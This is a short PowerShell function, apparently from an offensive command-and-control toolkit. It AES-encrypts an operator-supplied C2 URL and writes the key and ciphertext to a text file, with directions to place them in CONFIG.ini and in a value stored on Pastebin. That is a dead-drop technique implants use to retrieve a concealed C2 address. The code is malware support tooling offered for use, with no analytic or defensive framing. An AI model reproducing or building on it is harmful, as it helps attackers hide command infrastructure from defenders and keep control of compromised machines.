<#Used to Produce instructions files that you will used to Prepare C2 URL #> 
function PastebinStoredC2Value ($MyC2Url) {
	$Scriptfoler = Split-Path $script:MyInvocation.MyCommand.Path
	$key = Create-AesKey
	echo "Edit CONFIG.ini with keytoreadgetc2 ---->   $key" >  $Scriptfoler\prepareC2.txt
	$unencryptedString = $MyC2Url
	$encryptedString = Encrypt-String $key $unencryptedString
	echo "Edit Pastebin Stored C2 value with ---->   $encryptedString" >>  $Scriptfoler\prepareC2.txt
	
	$backToPlainText = Decrypt-String $key $encryptedString
	if ($unencryptedString -ne $backToPlainText) {
		echo "encryption didnt work!" >>  $Scriptfoler\pastebin.txt
	}
	else {
		echo "Test decryption ---->   $backToPlainText" >>  $Scriptfoler\prepareC2.txt
	}
}
